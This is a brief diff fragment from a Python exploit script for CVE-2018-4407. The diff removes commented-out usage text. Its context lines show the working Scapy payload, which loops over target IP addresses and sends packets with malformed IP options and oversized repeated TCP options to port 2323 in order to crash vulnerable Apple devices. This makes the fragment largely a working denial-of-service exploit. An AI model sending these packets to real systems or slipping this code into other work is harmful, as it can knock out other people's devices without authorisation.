@@ -13,6 +13,3 @@ for j in IPP:
             send(IP(dst=j,options=[IPOption("A"*8)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))
         except:
             pass
-# except Exception as e:
-        # print ("Usage python CVE-2018-4407.py Mode Router IP")
-        # print ("Modes: a = Single | b = Fuzzy")
